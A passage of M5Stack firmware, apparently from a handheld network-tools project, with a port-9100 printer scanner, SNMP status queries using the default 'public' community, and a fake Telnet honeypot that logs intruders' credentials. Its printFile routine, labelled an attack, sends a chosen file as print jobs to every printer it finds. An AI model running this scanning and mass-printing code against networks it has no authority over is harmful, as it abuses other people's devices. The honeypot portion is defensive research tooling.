  Serial.printf("[TEST] Checking IP: %s for printer on port 9100\n", ip.toString().c_str());

  if (connectWithTimeout(client, ip, 9100, timeout_ms)) {
    Serial.printf("[INFO] Printer detected at IP: %s\n", ip.toString().c_str());
    client.stop(); // Close the connection properly
    return true;
  } else {
    Serial.printf("[INFO] No printer found at IP: %s\n", ip.toString().c_str());
    return false;
  }
}

bool validateBaseIP(const String& baseIP) {
  int dotCount = 0;
  for (char c : baseIP) {
    if (c == '.') dotCount++;
    else if (!isDigit(c)) return false;
  }
  return dotCount == 2; // Ensures "192.168.1" contains only two dots
}

String getNetworkBase() {
  String baseIP = "";
  M5.Display.clear();
  M5.Display.setTextSize(2);
  M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
  M5.Display.setCursor(0, 0);
  M5.Display.println("Enter base IP (192.168.1):");
  M5.Display.setCursor(0, 50);

  while (true) {
    baseIP = "ok"; // Reuses your `getUserInput` function

    // If the user enters "ok", use the current network IP
    if (baseIP == "ok") {
      IPAddress currentIP = WiFi.localIP();
      char fallbackIP[16];
      sprintf(fallbackIP, "%d.%d.%d", currentIP[0], currentIP[1], currentIP[2]);
      return String(fallbackIP);
    }

    // Validate partial IP address format
    if (validateBaseIP(baseIP)) {
      return baseIP;
    } else {
      M5.Display.setCursor(0, 80);
      M5.Display.println("Invalid format! Retry.");
      delay(2000);
      M5.Display.clear();
      M5.Display.setCursor(0, 0);
      M5.Display.println("Enter base IP (192.168.1):");
    }
  }
}

void detectPrinter() {
  if (WiFi.localIP().toString() == "0.0.0.0") {
    Serial.println("[INFO] Not connected to a network.");
    waitAndReturnToMenu("Not connected to a network.");
    return;
  }

  // Get the base network IP
  String baseIP = getNetworkBase();
  char base_ip[16];
  sprintf(base_ip, "%s.", baseIP.c_str());

  Serial.println("[INFO] Network base IP: " + String(base_ip));
  M5.Display.clear();
  M5.Display.setCursor(0, 20);
  M5.Display.println("Scanning for printers...");
  M5.Display.display();

  detectedPrinters.clear();

  // Scan subnet IP addresses
  for (int i = 1; i <= 254; i++) {
    IPAddress currentIP;
    sscanf(base_ip, "%d.%d.%d.", &currentIP[0], &currentIP[1], &currentIP[2]);
    currentIP[3] = i;

    Serial.printf("[DEBUG] Checking IP: %s\n", currentIP.toString().c_str());

    // Check directly for port 9100 with a 100ms timeout
    if (isPrinter(currentIP, 100)) {
      detectedPrinters.push_back(currentIP);
      Serial.printf("[INFO] Printer detected: %s\n", currentIP.toString().c_str());
    }

    // Progress update
    if (i % 10 == 0) {
      M5.Display.setCursor(0, 40);
      M5.Display.printf("Scanned %d/254 IPs...\n", i);
      M5.Display.display();
    }
  }

  // Final result
  M5.Display.clear();
  if (detectedPrinters.empty()) {
    M5.Display.setCursor(0, 20);
    M5.Display.println("No printers detected.");
    M5.Display.println("Returning to menu...");
    M5.Display.display();
    Serial.println("[INFO] No printers detected.");
  } else {
    M5.Display.setCursor(0, 20);
    M5.Display.println("Printers found:");
    for (const auto &printerIP : detectedPrinters) {
      Serial.println(" - " + printerIP.toString());
      M5.Display.println(printerIP.toString());
    }
    M5.Display.display();
  }

  delay(2000);
  waitAndReturnToMenu("return to menu");
}

void printFile() {
  if (WiFi.localIP().toString() == "0.0.0.0") {
    Serial.println("[INFO] Not connected to a network.");
    waitAndReturnToMenu("Not connected to a network.");
    return;
  }
  // File path to print and printer IP configuration
  String filePath = "/Printer/File-To-Print.txt"; // Replace with your file
  String printerConfigPath = "/Printer/PrinterIp.txt";

  std::vector<IPAddress> printerIPs;

  // Check for necessary files
  if (!SD.exists(filePath)) {
    M5.Display.clear();
    M5.Display.setCursor(0, 20);
    M5.Display.println("File not found:");
    M5.Display.println(filePath);
    waitAndReturnToMenu("return to menu");
    return;
  }

  if (!SD.exists(printerConfigPath)) {
    Serial.println("Printer configuration file not found.");
  }

  // Open printer configuration file
  File config = SD.open(printerConfigPath);
  if (config) {
    while (config.available()) {
      String line = config.readStringUntil('\n');
      line.trim(); // Removes whitespace and newlines
      if (line.length() > 0) {
        IPAddress ip;
        if (ip.fromString(line)) {
          printerIPs.push_back(ip);
        } else {
          Serial.printf("Invalid IP format in PrinterIp.txt: %s\n", line.c_str());
        }
      }
    }
    config.close();
  }

  // If the file is empty, use detected printers
  if (printerIPs.empty()) {
    printerIPs = detectedPrinters;
  }

  // Check if there are printers to process
  if (printerIPs.empty()) {
    M5.Display.clear();
    M5.Display.setCursor(0, 20);
    M5.Display.println("No printers detected");
    M5.Display.println("or configured.");
    M5.Display.println("Returning to menu...");
    M5.Display.display();
    delay(2000);
    waitAndReturnToMenu("return to menu");
    return;
  }

  // Confirm operation with the user
  String message = "Attack " + String(printerIPs.size()) + " printers?";
  if (!confirmPopup(message)) {
    M5.Display.clear();
    M5.Display.setCursor(0, 20);
    M5.Display.println("Operation cancelled by user.");
    M5.Display.display();
    delay(2000);
    waitAndReturnToMenu("return to menu");
    return;
  }

  // Open the file to print
  File file = SD.open(filePath);
  if (!file) {
    M5.Display.clear();
    M5.Display.setCursor(0, 20);
    M5.Display.println("Failed to open file:");
    M5.Display.println(filePath);
    M5.Display.println("Returning to menu...");
    M5.Display.display();
    delay(2000);
    waitAndReturnToMenu("return to menu");
    return;
  }

  // Send the file to each printer
  for (IPAddress printerIP : printerIPs) {
    WiFiClient client;

    // Connect to the printer on port 9100
    if (!client.connect(printerIP, 9100)) {
      Serial.printf("Failed to connect to printer: %s\n", printerIP.toString().c_str());
      continue;
    }

    // Display current status on the screen
    M5.Display.clear();
    M5.Display.setCursor(0, 20);
    M5.Display.println("Printing to:");
    M5.Display.println(printerIP.toString());
    M5.Display.display();
    delay(200);

    // Reset file position
    file.seek(0);

    // Read the file and send its content to the printer
    while (file.available()) {
      String line = file.readStringUntil('\n'); // Read line by line
      client.println(line);                     // Send to the printer
    }

    client.stop();
    Serial.printf("Print job completed for printer: %s\n", printerIP.toString().c_str());
  }

  file.close();

  // Confirm operation completion
  M5.Display.clear();
  M5.Display.setCursor(0, 20);
  M5.Display.println("Print job completed");
  M5.Display.println("on all printers!");
  M5.Display.display();
  delay(2000);
  waitAndReturnToMenu("return to menu");
}



// Define the SNMP community and port
#define SNMP_PORT 161
#define SNMP_COMMUNITY "public"

// Function to encode an OID into BER format
int encodeOID(const char* oidStr, uint8_t* outBuffer, size_t outSize) {
  std::vector<int> parts;
  char temp[64];
  strncpy(temp, oidStr, sizeof(temp) - 1);
  temp[sizeof(temp) - 1] = '\0';

  char* token = strtok(temp, ".");
  while (token) {
    parts.push_back(atoi(token));
    token = strtok(nullptr, ".");
  }

  if (parts.size() < 2) return -1; // Invalid OID

  int pos = 0;
  outBuffer[pos++] = (uint8_t)(parts[0] * 40 + parts[1]);

  for (size_t i = 2; i < parts.size(); i++) {
    int val = parts[i];
    if (val < 128) {
      outBuffer[pos++] = (uint8_t)val;
    } else {
      return -1; // Simplified: no multi-byte support
    }
    if (pos >= (int)outSize) return -1;
  }
  return pos;
}


bool parseSNMPResponse(const uint8_t* buffer, size_t bufferLen, String &outValue) {
  // Keep an index that moves through buffer
  size_t index = 0;

  // 1) Expect top-level SEQUENCE (0x30)
  if (buffer[index++] != 0x30) {
    Serial.println("[ERROR] Not a SEQUENCE at top-level.");
    return false;
  }
  // Read length
  uint8_t snmpMsgLength = buffer[index++];

  // 2) Read version INTEGER
  if (buffer[index++] != 0x02) {
    Serial.println("[ERROR] Expected version INTEGER tag.");
    return false;
  }
  uint8_t versionLength = buffer[index++];
  // Skip the version bytes
  index += versionLength;

  // 3) Read community OCTET STRING
  if (buffer[index++] != 0x04) {
    Serial.println("[ERROR] Expected community OCTET STRING tag.");
    return false;
  }
  uint8_t communityLength = buffer[index++];
  // Skip the community bytes
  index += communityLength;

  // 4) Read PDU type (0xA2 for Get-Response)
  uint8_t pduType = buffer[index++];
  if (pduType != 0xA2) {
    Serial.printf("[WARN] Unexpected PDU type: 0x%02X\n", pduType);
  }
  uint8_t pduLength = buffer[index++];

  // 5) Read request-id INTEGER
  if (buffer[index++] != 0x02) {
    Serial.println("[ERROR] Expected request-id INTEGER tag.");
    return false;
  }
  uint8_t ridLength = buffer[index++];
  index += ridLength; // skip request id bytes

  // 6) Read error-status INTEGER
  if (buffer[index++] != 0x02) {
    Serial.println("[ERROR] Expected error-status INTEGER tag.");
    return false;
  }
  uint8_t errStatusLen = buffer[index++];
  index += errStatusLen; // skip error status

  // 7) Read error-index INTEGER
  if (buffer[index++] != 0x02) {
    Serial.println("[ERROR] Expected error-index INTEGER tag.");
    return false;
  }
  uint8_t errIndexLen = buffer[index++];
  index += errIndexLen; // skip error index

  // 8) Read variable-bindings SEQUENCE
  if (buffer[index++] != 0x30) {
    Serial.println("[ERROR] Expected VarBind list SEQUENCE (0x30).");
    return false;
  }
  uint8_t vbListLength = buffer[index++];

  // 9) Read first VarBind SEQUENCE
  if (buffer[index++] != 0x30) {
    Serial.println("[ERROR] Expected single VarBind SEQUENCE (0x30).");
    return false;
  }
  uint8_t vbLength = buffer[index++];

  // 10) Read the OID
  if (buffer[index++] != 0x06) {
    Serial.println("[ERROR] Expected OID tag (0x06).");
    return false;
  }
  uint8_t oidLength = buffer[index++];
  // skip the OID bytes
  index += oidLength;

  // 11) Now read the Value portion
  uint8_t valueTag = buffer[index++];
  uint8_t valueLen = buffer[index++];

  if (valueTag == 0x04) {
    // OCTET STRING
    // Copy out the next valueLen bytes as text
    char temp[128];
    if (valueLen >= sizeof(temp)) valueLen = sizeof(temp) - 1;
    memcpy(temp, &buffer[index], valueLen);
    temp[valueLen] = '\0';
    outValue = String(temp);
  }
  else if (valueTag == 0x02) {
    // INTEGER
    if (valueLen == 1) {
      int val = buffer[index];
      outValue = String(val);
    } else {
      // For simplicity, handle only 1-byte integers in this example
      outValue = F("[Unsupported multi-byte INTEGER]");
    }
  }
  else if (valueTag == 0x43) {
    // TIME TICKS
    // Usually 4 bytes, big-endian
    if (valueLen == 4) {
      uint32_t ticks =
        (uint32_t)buffer[index] << 24 |
        (uint32_t)buffer[index + 1] << 16 |
        (uint32_t)buffer[index + 2] <<  8 |
        (uint32_t)buffer[index + 3];
      // Convert ticks (1/100s) to some readable format
      // E.g., "1d 10:20:30" etc.
      outValue = String(ticks) + " (raw ticks)";
    } else {
      outValue = F("[Unsupported TIME TICKS length]");
    }
  }
  else {
    // For any other tag
    outValue = F("[Unhandled data type]");
  }

  // Advance index by valueLen
  index += valueLen;

  return true;
}


// Function to send an SNMP GET request
bool sendSNMPRequest(IPAddress printerIP, const char* oid, String& response) {
  uint8_t packet[100];
  int pos = 0;

  // SNMP header
  packet[pos++] = 0x30; // Sequence
  int lengthPos = pos++;

  // Version
  packet[pos++] = 0x02; // Integer
  packet[pos++] = 0x01;
  packet[pos++] = 0x00; // SNMP version 1

  // Community
  packet[pos++] = 0x04; // Octet string
  packet[pos++] = strlen(SNMP_COMMUNITY);
  memcpy(&packet[pos], SNMP_COMMUNITY, strlen(SNMP_COMMUNITY));
  pos += strlen(SNMP_COMMUNITY);

  // PDU header
  packet[pos++] = 0xA0; // GET Request
  int pduLengthPos = pos++;

  packet[pos++] = 0x02; // Integer (request ID)
  packet[pos++] = 0x01;
  packet[pos++] = 0x01; // Request ID = 1

  packet[pos++] = 0x02; // Integer (error status)
  packet[pos++] = 0x01;
  packet[pos++] = 0x00; // No error

  packet[pos++] = 0x02; // Integer (error index)
  packet[pos++] = 0x01;
  packet[pos++] = 0x00; // No error

  // Variable bindings
  packet[pos++] = 0x30; // SEQUENCE (Variable-binding structure)
  int vbSequenceLengthPos = pos++; // Placeholder for the length of the entire variable-binding sequence

  // Single variable-binding
  packet[pos++] = 0x30; // SEQUENCE (Single variable-binding)
  int vbLengthPos = pos++; // Placeholder for the length of this variable-binding

  // Add the OID
  packet[pos++] = 0x06; // OBJECT IDENTIFIER
  uint8_t encodedOID[32];
  int encodedLen = encodeOID(oid, encodedOID, sizeof(encodedOID));
  if (encodedLen < 0) return false;
  packet[pos++] = encodedLen; // Length of OID
  memcpy(&packet[pos], encodedOID, encodedLen);
  pos += encodedLen;

  // Add the value (NULL)
  packet[pos++] = 0x05; // NULL
  packet[pos++] = 0x00; // Length of NULL

  // Calculate the length of the single variable-binding
  packet[vbLengthPos] = pos - vbLengthPos - 1;

  // Calculate the length of the variable-binding sequence
  packet[vbSequenceLengthPos] = pos - vbSequenceLengthPos - 1;

  // Update the PDU and SNMP message lengths
  packet[pduLengthPos] = pos - pduLengthPos - 1;
  packet[lengthPos] = pos - lengthPos - 1;

  /*// Debug: Print the packet being sent
    Serial.println("[DEBUG] Sending SNMP Packet:");
    for (int i = 0; i < pos; i++) {
      Serial.printf("%02X ", packet[i]);
    }
    Serial.println();*/

  // Envoi du paquet
  udp.beginPacket(printerIP, SNMP_PORT);
  udp.write(packet, pos);
  udp.endPacket();

  // Attente de la réponse
  uint32_t startTime = millis();
  while (millis() - startTime < 1000) {
    int packetSize = udp.parsePacket();
    if (packetSize) {
      uint8_t buffer[255];
      udp.read(buffer, sizeof(buffer));

      /*// Debug : afficher le paquet reçu
        Serial.println("[DEBUG] Received SNMP Response:");
        for (int i = 0; i < packetSize; i++) {
          Serial.printf("%02X ", buffer[i]);
        }
        Serial.println();*/

      // Appel à une fonction de parsing BER-SNMP (à implémenter ou à inclure d'une librairie)
      String parsedValue;
      if (parseSNMPResponse(buffer, packetSize, parsedValue)) {
        response = parsedValue;
      } else {
        response = F("Parsing error");
      }

      return true;
    }
  }

  return false;
}

void checkPrinterStatus() {
  int displayStart = 0;
  int lineHeight = 12;
  int maxLines = M5.Display.height() / lineHeight;
  bool needsDisplayUpdate = true;

  if (WiFi.localIP().toString() == "0.0.0.0") {
    waitAndReturnToMenu("Not connected...");
    return;
  }

  // On prépare notre vecteur de lignes à afficher
  std::vector<String> printerLines;
  printerLines.reserve(50); // Par exemple, on réserve un peu d'espace

  // Chemin de config
  String printerConfigPath = "/Printer/PrinterIp.txt";
  std::vector<IPAddress> printerIPs;

  // Lecture du fichier IP
  if (SD.exists(printerConfigPath)) {
    File config = SD.open(printerConfigPath);
    if (config) {
      while (config.available()) {
        String line = config.readStringUntil('\n');
        line.trim();
        IPAddress ip;
        if (ip.fromString(line)) {
          printerIPs.push_back(ip);
        }
      }
      config.close();
    }
  }

  if (printerIPs.empty()) {
    Serial.println("[INFO] No printers detected or configured.");
    printerIPs = detectedPrinters;

  }

  // OIDs SNMP
  const char* deviceOid = "1.3.6.1.2.1.25.3.2.1.3.1";
  const char* statusOid = "1.3.6.1.2.1.25.3.2.1.5.1";
  const char* uptimeOid = "1.3.6.1.2.1.1.3.0";

  // Pour chaque imprimante
  for (const auto& printerIP : printerIPs) {
    String device = "Unknown";
    String status = "Unknown";
    String uptime = "Unknown";

    bool okDevice = sendSNMPRequest(printerIP, deviceOid, device);
    bool okStatus = sendSNMPRequest(printerIP, statusOid, status);
    bool okUptime = sendSNMPRequest(printerIP, uptimeOid, uptime);

    printerLines.push_back("-----------------------");
    printerLines.push_back(printerIP.toString());
    printerLines.push_back("-----------------------");

    // DEVICE
    if (okDevice) {
      printerLines.push_back(device);
      Serial.printf("[INFO] %s => Device: %s\n",
                    printerIP.toString().c_str(),
                    device.c_str());
    } else {
      printerLines.push_back("Device: Error");
      Serial.printf("[ERROR] %s => Device fetch failed\n",
                    printerIP.toString().c_str());
    }

    // STATUS
    if (okStatus) {
      // Convertir la valeur (1..5) en chaîne
      if (status.equals("1"))      status = "Unknown";
      else if (status.equals("2")) status = "Running";
      else if (status.equals("3")) status = "Warning";
      else if (status.equals("4")) status = "Testing";
      else if (status.equals("5")) status = "Down";
      else                         status = "Other";

      printerLines.push_back(status);
      Serial.printf("[INFO] %s => Status: %s\n",
                    printerIP.toString().c_str(),
                    status.c_str());
    } else {
      printerLines.push_back("Status: Error");
      Serial.printf("[ERROR] %s => Status fetch failed\n",
                    printerIP.toString().c_str());
    }

    if (okUptime) {
      // Si par ex. "113021400 (raw ticks)"
      if (uptime.endsWith("(raw ticks)")) {
        int spaceIndex = uptime.indexOf(' ');
        if (spaceIndex > 0) {
          String ticksStr = uptime.substring(0, spaceIndex);
          uint32_t ticksVal = ticksStr.toInt();

          // Convert ticks in j/h/m/s
          uint32_t totalSeconds = ticksVal / 100;
          uint32_t days    = totalSeconds / 86400;
          uint32_t hours   = (totalSeconds % 86400) / 3600;
          uint32_t minutes = (totalSeconds % 3600) / 60;
          uint32_t seconds = totalSeconds % 60;

          char buff[64];
          snprintf(buff, sizeof(buff),
                   "%ud %02u:%02u:%02u", days, hours, minutes, seconds);
          uptime = String(buff);
        }
      }
      printerLines.push_back(uptime);
      Serial.printf("[INFO] %s => Uptime: %s\n",
                    printerIP.toString().c_str(),
                    uptime.c_str());
    } else {
      printerLines.push_back("Uptime: Error");
      Serial.printf("[ERROR] %s => Uptime fetch failed\n",
                    printerIP.toString().c_str());
    }
  }

  printerLines.push_back("-----------------------");
  printerLines.push_back("Scan Terminated.");
  printerLines.push_back("-----------------------");

  displayStart = 0; // on remet à zéro l'index de scroll
  needsDisplayUpdate = true;
  enterDebounce();
  while (true) {
    M5.update();

    if (handleScrolling(displayStart, maxLines, printerLines.size())) {
      needsDisplayUpdate = true;
    }

    if (needsDisplayUpdate) {
      displayResults(displayStart, maxLines, printerLines);
      needsDisplayUpdate = false;
    }

    if (M5.BtnB.wasPressed()) {
      break;
    }
    delay(50);
  }

  waitAndReturnToMenu("return to menu");
}




// -- Global configuration --
int honeypotPort = 23;
String honeypotLogFile = "/honeypot_logs.txt";
WiFiServer honeypotServer(honeypotPort);

// -- Start the Telnet honeypot --
void startHoneypot() {
  honeypotServer.begin();
  Serial.println("Fake Telnet service started on port " + String(honeypotPort));
  M5.Display.clear(); // Effacer l'écran
  M5.Display.setTextSize(2);
  M5.Display.setCursor(0, 0);
  M5.Display.setTextColor(menuTextUnFocusedColor);
  M5.Display.println("Honeypot Started !");
  M5.Display.println("Waiting interaction...");
  while (true) {
    M5.update();
    honeypotLoop();
    if (M5.BtnB.wasPressed()) {
      break;
    }
    delay(10);
  }
  honeypotServer.stop();
  Serial.println("Honeypot stopped.");
  waitAndReturnToMenu("Honeypot stopped.");
}

// -- Main loop to check for incoming clients --
void honeypotLoop() {
  WiFiClient client = honeypotServer.available();
  if (client) {
    handleHoneypotClient(client);
  }
}

// -- Log commands and credentials to a file on SD --
#define MAX_LOG_LINES 4 // Nombre maximum de lignes affichées à l'écran
String logBuffer[MAX_LOG_LINES]; // Buffer circulaire pour les logs
int currentLogIndex = 0; // Index du prochain emplacement dans le buffer

// -- Log commands and credentials to a file on SD and display on screen with scrolling --
void logHoneypotCommand(String clientIP, String command) {
  File logFile = SD.open(honeypotLogFile, FILE_APPEND);
  if (!logFile) {
    Serial.println("Error: Unable to open log file.");
    return;
  }

  // Créer une entrée log avec timestamp
  String logEntry = "[" + String(millis()) + "] ";
  logEntry += "IP: " + clientIP + " - Command: " + command;
  logFile.println(logEntry);
  logFile.close();

  // Afficher dans le terminal série
  Serial.println("------------------");
  Serial.println("IP: " + clientIP);
  Serial.println("Command: " + command);
  Serial.println("------------------");

  // Ajouter au buffer circulaire pour affichage
  String formattedLog = "IP: " + clientIP + "\n" + command + "\n------------------";
  logBuffer[currentLogIndex] = formattedLog;
  currentLogIndex = (currentLogIndex + 1) % MAX_LOG_LINES; // Gestion du buffer circulaire

  // Redessiner l'écran avec les logs
  redrawScreenWithLogs();
}

// -- Helper function to redraw the screen with all logs in the buffer --
void redrawScreenWithLogs() {
  M5.Display.clear(); // Effacer l'écran
  M5.Display.setTextSize(2);
  M5.Display.setCursor(0, 0);
  M5.Display.setTextColor(menuTextUnFocusedColor);

  // Afficher les logs du buffer dans l'ordre
  int startIndex = currentLogIndex; // Commencer par la position actuelle dans le buffer
  for (int i = 0; i < MAX_LOG_LINES; i++) {
    int index = (startIndex + i) % MAX_LOG_LINES;
    if (logBuffer[index] != "") { // Ignorer les lignes vides (au démarrage)
      M5.Display.println(logBuffer[index]);
    }
  }
}


// -- Handle interaction with a single Telnet client --
void handleHoneypotClient(WiFiClient client) {
  // Prompt pour le login
  client.print("\r\nlogin: ");
  String username = readLine(client, false);  // pas d'écho
  logHoneypotCommand(client.remoteIP().toString(), "LOGIN username: " + username);

  // Prompt pour le password
  client.print("Password: ");
  String password = readLine(client, false);
  logHoneypotCommand(client.remoteIP().toString(), "LOGIN password: " + password);

  // Simulation d’un login réussi (peu importe les identifiants)
  client.println("\r\nWelcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-109-generic x86_64)");
  client.println(" * Documentation:  https://help.ubuntu.com");
  client.println(" * Management:     https://landscape.canonical.com");
  client.println(" * Support:        https://ubuntu.com/advantage\r\n");

  // Émulation d’un shell
  String currentDirectory = "/home/pi";
  String prompt = "pi@ubuntu:~$ ";

  while (client.connected()) {
    client.print(prompt);
    String command = readLine(client, false); // on ne renvoie jamais les caractères
    command.trim();

    // Log de la commande
    logHoneypotCommand(client.remoteIP().toString(), command);

    //------------------------------------------------
    // 1. Commandes de sortie
    //------------------------------------------------
    if (command.equalsIgnoreCase("exit") || command.equalsIgnoreCase("logout")) {
      client.println("Goodbye.");
      break;
    }

    //------------------------------------------------
    // 2. Commandes classiques
    //------------------------------------------------
    else if (command.equals("pwd")) {
      client.println(currentDirectory);
    }
    else if (command.equals("whoami")) {
      client.println("pi");
    }
    else if (command.equals("uname -a")) {
      client.println("Linux ubuntu 5.4.0-109-generic #123-Ubuntu SMP x86_64 GNU/Linux");
    }
    else if (command.equals("hostname")) {
      client.println("ubuntu");
    }
    else if (command.equals("uptime")) {
      client.println(" 12:15:01 up 1:15,  2 users,  load average: 0.00, 0.03, 0.00");
    }
    else if (command.equals("free -h")) {
      client.println("              total        used        free      shared  buff/cache   available");
      client.println("Mem:          1000M        200M        600M         10M        200M        700M");
      client.println("Swap:         1024M          0B       1024M");
    }
    else if (command.equals("df -h")) {
      client.println("Filesystem      Size  Used Avail Use% Mounted on");
      client.println("/dev/sda1        50G   15G   33G  31% /");
      client.println("tmpfs           100M  1.2M   99M   2% /run");
      client.println("tmpfs           500M     0  500M   0% /dev/shm");
    }
    else if (command.equals("ps aux")) {
      client.println("USER       PID  %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND");
      client.println("root         1   0.0  0.1  22564  1124 ?        Ss   12:00   0:01 /sbin/init");
      client.println("root       539   0.0  0.3  46896  3452 ?        Ss   12:00   0:00 /lib/systemd/systemd-journald");
      client.println("pi        1303   0.0  0.2  10820  2220 pts/0    Ss+  12:05   0:00 bash");
      client.println("pi        1304   0.0  0.2  10820  2152 pts/1    Ss+  12:06   0:00 bash");
    }
    else if (command.equals("top")) {
      client.println("top - 12:10:11 up  1:10,  2 users,  load average: 0.01, 0.05, 0.00");
      client.println("Tasks:  93 total,   1 running,  92 sleeping,   0 stopped,   0 zombie");
      client.println("%Cpu(s):  0.0 us,  0.2 sy,  0.0 ni, 99.7 id,  0.1 wa,  0.0 hi,  0.0 si,  0.0 st");
      client.println("MiB Mem :   1000.0 total,    600.0 free,    200.0 used,    200.0 buff/cache");
      client.println("MiB Swap:   1024.0 total,   1024.0 free,      0.0 used.    700.0 avail Mem");
      client.println("");
      client.println("  PID USER      PR  NI    VIRT    RES    SHR S  %CPU %MEM     TIME+ COMMAND");
      client.println(" 1303 pi        20   0   10820   2220   2168 S   0.0  0.2   0:00.03 bash");
      client.println(" 1304 pi        20   0   10820   2152   2096 S   0.0  0.2   0:00.01 bash");
    }

    //------------------------------------------------
    // 3. Navigation et gestion de fichiers
    //------------------------------------------------
    else if (command.startsWith("ls")) {
      // On affiche des fichiers différents selon currentDirectory
      bool longListing = (command.indexOf("-l") >= 0);

      // /home/pi
      if (currentDirectory.equals("/home/pi")) {
        if (longListing) {
          client.println("total 20");
          client.println("drwxr-xr-x  2 pi  pi  4096 Jan  1 12:00 Documents");
          client.println("drwxr-xr-x  2 pi  pi  4096 Jan  1 12:00 Downloads");
          client.println("-rw-r--r--  1 pi  pi   220 Jan  1 12:00 .bashrc");
          client.println("-rw-r--r--  1 pi  pi  3523 Jan  1 12:00 .profile");
          client.println("-rw-r--r--  1 pi  pi    50 Jan  1 12:00 secrets.txt");
        } else {
          client.println("Documents  Downloads  .bashrc  .profile  secrets.txt");
        }
      }
      // /home/pi/Documents
      else if (currentDirectory.equals("/home/pi/Documents")) {
        if (longListing) {
          client.println("total 16");
          client.println("-rw-r--r--  1 pi  pi   80 Jan  1 12:00 mysql_credentials.txt");
          client.println("-rw-r--r--  1 pi  pi  120 Jan  1 12:00 password_list.txt");
          client.println("-rw-r--r--  1 pi  pi  600 Jan  1 12:00 financial_report_2023.xlsx");
          client.println("-rw-r--r--  1 pi  pi   20 Jan  1 12:00 readme.md");
        } else {
          client.println("mysql_credentials.txt  password_list.txt  financial_report_2023.xlsx  readme.md");
        }
      }
      // /home/pi/Downloads
      else if (currentDirectory.equals("/home/pi/Downloads")) {
        if (longListing) {
          client.println("total 8");
          client.println("-rw-r--r--  1 pi  pi  102 Jan  1 12:00 malware.sh");
          client.println("-rw-r--r--  1 pi  pi  250 Jan  1 12:00 helpful_script.py");
        } else {
          client.println("malware.sh  helpful_script.py");
        }
      }
      else if (currentDirectory.equals("/home")) {
        if (longListing) {
          client.println("total 8");
          client.println("drw-r--r--  1 pi  pi  102 Jan  1 12:00 pi");
        } else {
          client.println("pi");
        }
      }
      else if (currentDirectory.equals("/")) {
        if (longListing) {
          client.println("total 8");
          client.println("drw-r--r--  1 pi  pi  102 Jan  1 12:00 home");
        } else {
          client.println("home");
        }
      }
      // Autres répertoires
      else {
        // Par défaut, on met un ls vide ou un message
        client.println("No files found.");
      }
    }
    else if (command.startsWith("cd ")) {
      String newDir = command.substring(3);
      newDir.trim();

      // Simulation du changement de répertoire
      if (newDir.equals("..")) {
        // Retour en arrière dans l'arborescence
        if (currentDirectory.equals("/home/pi")) {
          currentDirectory = "/home";
          prompt = "pi@ubuntu:/home$ ";
        }
        else if (currentDirectory.equals("/home")) {
          currentDirectory = "/";
          prompt = "pi@ubuntu:/$ ";
        }
        else if (currentDirectory.equals("/")) {
          client.println("bash: cd: ..: No such file or directory");
        }
        else {
          client.println("bash: cd: ..: No such file or directory");
        }
      }
      else if (newDir.equals("/") || newDir.equals("~")) {
        // Aller à la racine ou au répertoire utilisateur
        currentDirectory = (newDir.equals("~")) ? "/home/pi" : "/";
        prompt = (newDir.equals("~")) ? "pi@ubuntu:~$ " : "pi@ubuntu:/$ ";
      }
      else if (newDir.equals("home") && currentDirectory.equals("/")) {
        // Aller explicitement à /home depuis /
        currentDirectory = "/home";
        prompt = "pi@ubuntu:/home$ ";
      }
      else if (newDir.equals("pi") && currentDirectory.equals("/home")) {
        // Aller explicitement à /home/pi depuis /home
        currentDirectory = "/home/pi";
        prompt = "pi@ubuntu:~$ ";
      }
      else if (newDir.equals("Documents") && currentDirectory.equals("/home/pi")) {
        // Aller à Documents uniquement si on est dans /home/pi
        currentDirectory = "/home/pi/Documents";
        prompt = "pi@ubuntu:~/Documents$ ";
      }
      else if (newDir.equals("Downloads") && currentDirectory.equals("/home/pi")) {
        // Aller à Downloads uniquement si on est dans /home/pi
        currentDirectory = "/home/pi/Downloads";
        prompt = "pi@ubuntu:~/Downloads$ ";
      }
      else {
        // Gestion des chemins absolus ou chemins non valides
        if (newDir.startsWith("/home/pi/")) {
          if (newDir.equals("/home/pi/Documents")) {
            currentDirectory = "/home/pi/Documents";
            prompt = "pi@ubuntu:~/Documents$ ";
          } else if (newDir.equals("/home/pi/Downloads")) {
            currentDirectory = "/home/pi/Downloads";
            prompt = "pi@ubuntu:~/Downloads$ ";
          } else {
            client.println("bash: cd: " + newDir + ": No such file or directory");
          }
        } else if (newDir.startsWith("/home/")) {
          currentDirectory = "/home";
          prompt = "pi@ubuntu:/home$ ";
        } else {
          client.println("bash: cd: " + newDir + ": No such file or directory");
        }
      }
    }
    else if (command.startsWith("mkdir ")) {
      String dirName = command.substring(6);
      dirName.trim();
      client.println("Directory '" + dirName + "' created.");
    }
    else if (command.startsWith("rmdir ")) {
      String dirName = command.substring(6);
      dirName.trim();
      client.println("Directory '" + dirName + "' removed.");
    }
    else if (command.startsWith("rm ")) {
      client.println("File removed successfully.");
    }
    else if (command.startsWith("mv ") || command.startsWith("cp ")) {
      client.println("Operation completed successfully.");
    }
    else if (command.startsWith("chmod ")) {
      client.println("Permissions changed.");
    }
    else if (command.startsWith("chown ")) {
      client.println("Ownership changed.");
    }
    else if (command.startsWith("touch ")) {
      String fileName = command.substring(6);
      fileName.trim();
      client.println("File '" + fileName + "' created or timestamp updated.");
    }

    //------------------------------------------------
    // 4. Lecture de fichiers (cat)
    //------------------------------------------------
    else if (command.startsWith("cat ")) {
      String fileName = command.substring(4);
      fileName.trim();

      // Gestion de cas particuliers absolus
      if (fileName == "/etc/passwd") {
        client.println("root:x:0:0:root:/root:/bin/bash");
        client.println("daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin");
        client.println("bin:x:2:2:bin:/bin:/usr/sbin/nologin");
        client.println("sys:x:3:3:sys:/dev:/usr/sbin/nologin");
        client.println("pi:x:1000:1000:,,,:/home/pi:/bin/bash");
      }
      else if (fileName == "/etc/shadow") {
        client.println("root:*:18948:0:99999:7:::");
        client.println("daemon:*:18948:0:99999:7:::");
        client.println("bin:*:18948:0:99999:7:::");
        client.println("sys:*:18948:0:99999:7:::");
        client.println("pi:$6$randomsalt$somehashedpassword:18948:0:99999:7:::");
      }
      else {
        // On gère les chemins relatifs ou absolus (simples) en tenant compte du currentDirectory
        // Pour simplifier, on traite les fichiers "connus" en fonction du répertoire courant

        // Normaliser si besoin (ex: cat /home/pi/Documents/...).
        // On peut faire un check direct, ou reconstituer le "fullPath".
